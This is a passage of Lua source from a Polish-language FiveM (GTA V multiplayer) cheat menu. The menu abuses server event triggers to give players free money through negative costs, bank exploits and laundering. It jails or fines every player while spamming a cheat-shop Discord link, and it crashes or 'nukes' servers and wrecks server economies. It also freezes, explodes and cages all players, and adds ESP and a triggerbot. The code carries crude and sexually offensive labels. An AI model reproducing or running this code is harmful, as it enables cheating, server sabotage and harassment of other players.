                elseif piesaries('~h~~w~Kup ~w~auto za ~g~darmo') then
---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie                   
				   freevehc1()
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ESXItems') then
                if piesaries('~h~~w~Pickup ~g~Cannabis') then
                    pickupcannabis()
                elseif piesaries('~h~~w~Process ~g~Cannabis') then
                    proccesscannabis()
                elseif piesaries('~h~~w~Harvest ~g~Weed') then
                    hweed()
                elseif piesaries('~h~~w~Transform ~g~Weed') then
                    tweed()
                elseif piesaries('~h~~w~Sell ~g~Weed') then
                    sweed()
                elseif piesaries('~h~~w~Harvest ~w~Coke') then
                    hcoke()
                elseif piesaries('~h~~w~Transform ~w~Coke') then
                    tcoke()
                elseif piesaries('~h~~w~Sell ~w~Coke') then
                    scoke()
                elseif piesaries('~h~~w~Harvest ~w~Meth') then
                    hmeth()
                elseif piesaries('~h~~w~Transform ~w~Meth') then
                    tmeth()
                elseif piesaries('~h~~w~Sell ~w~Meth') then
                    smeth()
                elseif piesaries('~h~~w~Harvest ~r~Opium') then
                    hopi()
                elseif piesaries('~h~~w~Transform ~r~Opium') then
                    topi()
                elseif piesaries('~h~~w~Sell ~r~Opium') then
                    sopi()
                elseif piesaries('~h~~w~Sell ~r~Drugs ~w~to ~g~NPC') then
                    snpc()
                elseif piesaries('~h~~w~Wash ~g~Money') then
                    mataaspalarufe()
                elseif piesaries('~h~~w~Harvest ~y~Bitcoin') then
                    harvestbitcoin()
                elseif piesaries('~h~~w~Sell ~y~Bitcoin') then
                    sellbitcoin()
                elseif piesaries('~h~~w~Harvest ~p~Gaz Bottle') then
                    harvestgazbottle()
                elseif piesaries('~h~~w~Craft ~p~Gaz Bottle') then
                    craftgazbottle()
                elseif piesaries('~h~~w~Harvest ~p~Repair Kit') then
                    harvestrepairkits()
                elseif piesaries('~h~~w~Craft ~p~Repair Kit') then
                    craftrepairkits()
                elseif piesaries('~h~~w~Harvest ~p~Body Kit') then
                    harvestbodykits()
                elseif piesaries('~h~~w~Craft ~p~Body Kit') then
                    craftbodykits()
                elseif piesaries('~h~~r~Hunting ~w~Reward') then
                    jebacariesa('esx-qalle-hunting:reward', 50)
                elseif piesaries('~h~~w~Stop All') then
                    matanumaispalarufe()
                elseif
                    jariesa(
                        '~h~~y~Spam dragami ~r~UWAGA!',
                        BlowDrugsUp,
                        function(dR)
                            BlowDrugsUp = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('VRPTriggers') then
                if piesaries('') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa(
                            'lscustoms:payGarage',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif piesaries('~r~~h~VRP ~g~Wygraj ~w~Slotsy') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('vrp_slotmachine:server:2', m)
                    end
                elseif piesaries('~g~~h~Paliwo ~y~full') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa(
                            'LegacyFuel:PayFuel',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif piesaries('~r~~h~VRP ~w~Zdobadz prawko') then
                    jebacariesa('dmv:success')
                elseif piesaries('~r~~h~VRP ~w~Wplac Pieniadze') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('Banca:deposit', m)
                        jebacariesa('bank:deposit', m)
                    end
                elseif piesaries('~r~~h~VRP ~w~Wyplac Pieniadze ') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('bank:withdraw', m)
                        jebacariesa('Banca:withdraw', m)
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('MiscTriggers') then
                if piesaries('~h~Wyslij wiadomosc w logi') then
                    local et = KeyboardInput('Enter message to send', '', 100)
                    jebacariesa('DiscordBot:playerDied', et, '1337')
                    av('The message:~n~' .. et .. '~n~Has been ~g~sent!', true)
               --[[elseif piesaries('~h~Send Fake Message') then
                    local eu = KeyboardInput('Enter player name', '', 100)
                    if eu then
                        local db = KeyboardInput('Enter message', '', 1000)
                        if db then
                            jebacariesa(
                                '_chat:messageEntered',
                                eu,
                                {
                                    0,
                                    0x99,
                                    255
                                },
                                db
                            )
                        end
                    end--]]
                elseif piesaries('~h~~g~ESX ~y~Zlodziej samochodow troll') then
                    av('~y~esx_carthief ~g~required', true)
                    av('~g~Trying to send alerts', false)
                    carthieftroll()
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('\65\100\118\77\10') then
                if smiecaries('~h~~b~-»~w~ Rozpierdol', 'Destroyer') then
                elseif smiecaries('~h~~b~-»~w~ ESP Menu', 'ESPMenu') then
                elseif smiecaries('~h~~b~-»~w~ Celowniki', 'CsMenu') then
                elseif
                    jariesa(
                        '~h~TriggerBot',
                        TriggerBot,
                        function(dR)
                            TriggerBot = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Oznaczenia graczy',
                        dx,
                        function(dx)
                        end
                    )
                 then
                    cL = not cL
                    dx = cL
                elseif
                    jariesa(
                        '~h~Nazwy graczy ~g~v1',
                        cM,
                        function(dR)
                            cM = dR
                            cN = false
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Id i nazwy graczy ~g~v2',
                        cN,
                        function(dR)
                            cN = dR
                            cM = false
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~Zamroz~w~ Wszystkich graczy',
                        freezeall,
                        function(dR)
                            freezeall = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~Wysadz~w~ Wszystkich graczy',
                        blowall,
                        function(dR)
                            blowall = dR
                        end
                    )
                 then
                elseif piesaries('~h~~r~Burgerek~w~ Wszystkim') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                pizda(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                pizda(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
						---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
                    end
                elseif
                    jariesa(
                        '~h~~r~Ra~g~nd~w~omowe ~w~kolory powiadomien',
                        rgbnot,
                        function(dR)
                            rgbnot = dR
                        end
                    )
                 then
                
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('CsMenu') then
                if
                    jariesa(
                        '~h~~y~Original ~w~Celownik',
                        crosshair,
                        function(dR)
                            crosshair = dR
                            crosshairc = false
                            crosshairc2 = false
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~Zkrzyzowany celownik',
                        crosshairc,
                        function(dR)
                            crosshair = false
                            crosshairc = dR
                            crosshairc2 = false
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~Kropka',
                        crosshairc2,
                        function(dR)
                            crosshair = false
                            crosshairc = false
                            crosshairc2 = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('Destroyer') then
                if piesaries('~h~~r~Wysadz ~w~Serwer') then
                    nukeserver()
                elseif 
                    jariesa(
                        '~h~~r~Cichy crasher',
                        servercrasherxd,
                        function(dR)
                            servercrasherxd = dR
                        end
                    )
					---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
                 then
                elseif piesaries('~h~~g~ESX ~r~Ekonomia ~w~v2') then
                    esxdestroyv2()
                elseif piesaries('~h~~g~ESX ~r~Rozpierdol ~w~ekonomie') then
                    EconomyDestroySalary1()
                elseif piesaries('~h~~g~ESX ~w~Daj wszystkim kase') then
                    giveeveryone()
                elseif piesaries('~h~~r~VRP ~w~Daj wszystkim kase') then
                    vrpdestroy()
                elseif piesaries('~h~~r~Zamknij~w~ Wszystkich graczy') then
                    for i = 0, 128 do
					jebacariesa("arisonarp:mandat", GetPlayerServerId(i), 32323232323, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY')
						jebacariesa("arisonarp:wiezienie", GetPlayerServerId(i), 321321312 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 424324234234)
						jebacariesa("wyspa_jail:SendMessagetrop", GetPlayerServerId(i), 32135412521, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY')
                        jebacariesa("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 32513251 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 321321321321)
						jebacariesa("esx_jailer:wyslijwiezienie", GetPlayerServerId(i), 3251 * 60, '^1Kochać skaze jebać ariesa | pozdro od bezia, buziaczki', 32513251)
						jebacariesa("projektsantos:wiezienie", GetPlayerServerId(i), 3251 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY',3251)
						jebacariesa("wyspa_jail:SendWiadomosc", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY')
						jebacariesa("esx-qale-jail:jailPlayer", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY')
						jebacariesa("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 1 * 60, '', 32)
						jebacariesa("wyspa_jail:SendMessage", GetPlayerServerId(i), 3251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY |')
						jebacariesa("esx_jailer:sendToJail", GetPlayerServerId(i), 800 * 60)
						jebacariesa("wyspa_jail:SendMessage2", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY' )
						jebacariesa("esx_jailer:sendToJail2", GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 32513251 )
						jebacariesa('esx_jailer:wysylandoo', 'Garbary123')
						jebacariesa("esx_jailer:wysylanko", GetPlayerServerId(i), 800 * 60)
						jebacariesa("esx_jailer:wysylandoo", GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 32513251, 'Garbary123')
                        jebacariesa('esx_jailer:sendToJail', GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 32513251 )
                       jebacariesa('esx_jail:sendToJail', GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 32513251)
					   jebacariesa("esx_jail:sendToJail", GetPlayerServerId(i), 3251 * 60)
                      jebacariesa('js:jailuser', GetPlayerServerId(i), 80000 * 60, 'https://discord.gg/UC9HrnY')
                    end
                elseif piesaries('~h~~y~Bananuj Wszystkich Graczy') then
                    bananapartyall()
                elseif piesaries('~h~~r~Wyruchaj~w~ Wszystkich Graczy') then
                    RapeAllFunc()
                elseif piesaries('~h~~r~Cage~w~ Wszystkich graczy') then
                    for i = 0, 255 do
                        x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i)))
                        roundx = tonumber(string.format('%.2f', x))
                        roundy = tonumber(string.format('%.2f', y))
                        roundz = tonumber(string.format('%.2f', z))
                        while not HasModelLoaded(GetHashKey('prop_fnclink_05crnr1')) do
                            Citizen.Wait(0)
                            pizda(GetHashKey('prop_fnclink_05crnr1'))
                        end
                        local e9 =
                            CreateObject(
                            GetHashKey('prop_fnclink_05crnr1'),
                            roundx - 1.70,
                            roundy - 1.70,
                            roundz - 1.0,
                            true,
                            true,
                            false
                        )
                        local ea =
                            CreateObject(
                            GetHashKey('prop_fnclink_05crnr1'),
                            roundx + 1.70,
                            roundy + 1.70,
                            roundz - 1.0,
                            true,
                            true,
                            false
                        )
                        SetEntityHeading(e9, -90.0)
                        SetEntityHeading(ea, 90.0)
                        FreezeEntityPosition(e9, true)
                        FreezeEntityPosition(ea, true)
                    end
                end
				skaza.Display()
            elseif skaza.IsMenuOpened('\107\111\103\117\115\122\10') then
                if smiecaries('~h~~b~-»~w~ ~r~ESX ~w~Triggery', '\101\115\120\121\10') then
				elseif smiecaries('~h~~b~-»~w~ Dzwieki', '\100\122\119\105\101\107\105\10') then
				elseif smiecaries('~h~~b~-»~w~ PedMenu', '\112\101\100\121\10') then
                end
				skaza.Display()
            elseif skaza.IsMenuOpened('pogoda') then
					
				
				if piesaries("Ustaw noc") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif piesaries("Ustaw dzien") then
				NetworkOverrideClockTime(12, 12, 0)
				

                end
				skaza.Display()
            elseif skaza.IsMenuOpened('\100\122\119\105\101\107\105\10') then
                if piesaries('~h~~p~~w~Dzwiek ~y~zamykania auta') then
						jebacariesa("InteractSound_SV:PlayWithinDistance", 103232, "lock", 1.0)	
				elseif piesaries('~h~~g~Dzwiek ~w~Kajdanek~w~') then
						jebacariesa('InteractSound_SV:PlayWithinDistance', 10000, 'handcuff', 1.0)
						jebacariesa('InteractSound_SV:PlayWithinDistance', 10000, 'Cuff', 1.0)
						jebacariesa('InteractSound_SV:PlayWithinDistance', 10000, 'cuffs', 1.0)
						jebacariesa('InteractSound_SV:PlayWithinDistance', 10000, 'cuffseffect', 1.0)
				elseif piesaries('~h~~g~Dzwiek ~w~Pasow~w~') then		
						jebacariesa('InteractSound_SV:PlayWithinDistance', 13232, 'pasysound', 1.0)
				
---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
                end
				skaza.Display()
            elseif skaza.IsMenuOpened('wioskarp') then
                if piesaries('~h~~b~-»~w~Mandat najblizszego gracza ') then
                    jebacariesa("wyspa_jail:SendWiadomosc", GetPlayerServerId(closestPlayer), 200000, '^1Chcesz kupic cheaty? ^3Pisz do ^5skaza^7#^53251 ^1 Sory za mandat mordo ale to nie ja to gosciu uzywa mojego menu' )
                elseif piesaries('~h~~b~-»~w~Wygrana zdrapki *tost*  ') then
					jebacariesa("tostzdrapka:wygranko")
				elseif piesaries('~h~~b~-»~w~Pranie pieniedzy x10000  ') then
				local dB =keyboardinput('Wpisz ilosc', '', 100000000)
					jebacariesa('esx_moneywash:washMoney', dB)
				end
				skaza.Display()
            elseif skaza.IsMenuOpened('\112\101\100\121\10') then
			
                if piesaries("\90\114\101\115\112\32\126\121\126\74\101\108\101\110\105\97\32\126\115\126\105\32\106\101\122\100\122\105\106\32\110\97\32\110\105\109\10") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif piesaries("\90\109\105\101\110\32\119\32\126\121\126\84\114\101\118\111\114\97\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben13 = Ggggg("player_two")
				chujkurwaichuj()
				pizda(keduxben13)
    while not HasModelLoaded(keduxben13) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben13)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben1)
				elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\109\111\112\115\97\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_pug")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie			
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\103\111\108\101\98\105\97\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_pigeon")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				
				elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\112\117\109\101\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_mtlion")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\122\111\109\98\105\101\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_m_m_genfat_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end
---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\122\111\109\98\105\101\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("u_m_y_zombie_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\107\115\105\101\100\122\97\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("ig_priest")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
					elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\109\105\101\115\110\105\97\107\97\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("u_m_y_babyd")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)		
						elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\107\111\116\97\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_cat_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
								elseif piesaries("\90\109\105\101\110\32\119\32\126\114\126\112\111\108\105\99\106\97\110\116\97\10") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("s_m_y_cop_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
	---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
								
				end   
				skaza.Display() 
            elseif skaza.IsMenuOpened('richrp') then
                if piesaries('~h~~p~~w~Sprzedawanie narko ~y~lokalsom') then
						jebacariesa("tostdrugs:udanyzakup", playerX, playerY, playerZ)	
				elseif piesaries('~h~~g~Pranie ~w~Pieniedzy ~w~') then
				local dB =keyboardinput('Wpisz ilosc', '', 100000000)
						jebacariesa('esx_moneywash:washMoney', dB)
				elseif piesaries('~h~~g~Dodawanie ~w~Pieniedzy~w~') then		
						local dB =keyboardinput('Wpisz ilosc', '', 100000000)
						jebacariesa("esx_garbagejobb:payy", dB)
				elseif piesaries('~h~~g~Plasterek ~w~~w~') then			
						chujaries('esx_ambulancejob:heal', 'big', true)
				elseif piesaries('~h~~g~Zdrapka ~w~~w~') then		
						chujaries('zdrapka:open')
				elseif piesaries('~h~~g~Pracowanie wiezienie ~w~~w~') then	
						
						chujaries("pNotify:SetQueueMax", "work", 20)
				end
                skaza.Display()
            elseif skaza.IsMenuOpened('crds') then
                if piesaries('~h~~b~-»~w~ skaza~r~ ~p~DEV') then
                    av('~h~~o~Beziu to ulana kurwa!~w~.', false)
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('WeaponTypes') then
                for e0, ev in pairs(b7) do
                    if smiecaries('~h~~b~-»~w~ ' .. e0, 'WeaponTypeSelection') then
                        dy = ev
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('WeaponTypeSelection') then
                for e0, ev in pairs(dy) do
                    if smiecaries(ev.name, 'WeaponOptions') then
                        dz = ev
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('WeaponOptions') then
                if piesaries('~h~~r~Zresp bron') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
                end
                if piesaries('~h~~g~Dodaj ammunicje') then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000)
                end
                if
                    jariesa(
                        '~h~~r~Nieskonczona ~w~Amunicja',
                        dz.bInfAmmo,
                        function(ew)
                        end
                    )
                 then
                    dz.bInfAmmo = not dz.bInfAmmo
                    SetPedInfiniteAmmo(GetPlayerPed(-1), dz.bInfAmmo, GetHashKey(dz.id))
                    SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                    PedSkipNextReloading(GetPlayerPed(-1))
                    SetPedShootRate(GetPlayerPed(-1), 1000)
                end
                for e0, ev in pairs(dz.mods) do
                    if smiecaries('~h~~b~-»~w~ ~h~~b~-» ~w~' .. e0, 'ModSelect') then
                        dA = ev
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ModSelect') then
                for _, ev in pairs(dA) do
                    if piesaries(ev.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if smiecaries('~h~~b~-»~w~ ' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if smiecaries('~h~~b~-»~w~ ~h~~b~-»~w~ ' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('CarOptions') then
                if piesaries('~h~~r~Zresp auto') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    pizda(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if smiecaries('~h~~b~-»~w~ ~h~~b~-»~w~ ' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                    av('~h~~w~Not in a vehicle', true)
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('MainTrailerSpa') then
                if piesaries('~h~~r~Zresp auto') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b5[TrailerToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    pizda(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            local SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            local ez = GetVehiclePedIsUsing(GetPlayerPed(-1))
                            AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('GiveSingleWeaponPlayer') then
                for i = 1, #b6 do
                    if piesaries(b6[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true)
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ESPMenu') then
                if
                    jariesa(
                        '~h~~r~ESP ~w~MasterSwitch',
                        esp,
                        function(dR)
                            esp = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~ESP ~w~Box',
                        espbox,
                        function(dR)
                            espbox = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~ESP ~w~Info',
                        espinfo,
                        function(dR)
                            espinfo = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~ESP ~w~Lines',
                        esplines,
                        function(dR)
                            esplines = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('LSC') then
                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if smiecaries('~h~~b~-»~w~ ~h~~r~Tuning wykonczenia', 'tunings') then
                elseif smiecaries('~h~~b~-»~w~ ~h~~r~Tuning mechaniczny', 'performance') then
                elseif piesaries('~h~Zmien tablice rej.') then
                    cu()
                elseif
                    jariesa(
                        '~h~~g~R~r~a~y~i~w~n~o~w~r~o~g~wy ~w~Kolor Auta',
                        RainbowVeh,
                        function(dR)
                            RainbowVeh = dR
                        end
                    )
                 then
                elseif piesaries('~h~Ubrudz ~y~auto') then
                    Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif piesaries('~h~Wyczysc ~g~auto') then
                    Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif
                    jariesa(
                        '~h~~g~R~r~a~y~i~w~n~o~w~r~o~g~we ~w~Neony & Lampy',
                        rainbowh,
                        function(dR)
                            rainbowh = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('BoostMenu') then
                if
                    skaza.ComboBox(
                        '~h~Przyspieszenie silnika',
                        dD,
                        dB,
                        dC,
                        function(ag, ah)
                            dB = ag
                            dC = ah
                            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), dC * 20.0)
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Przyspieszenie ~w~Auta ~g~2x',
                        t2x,
                        function(dR)
                            t2x = dR
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Przyspieszenie ~w~Auta ~g~4x',
                        t4x,
                        function(dR)
                            t2x = false
                            t4x = dR
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Przyspieszenie ~w~Auta ~g~10x',
                        t10x,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = dR
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    jariesa(
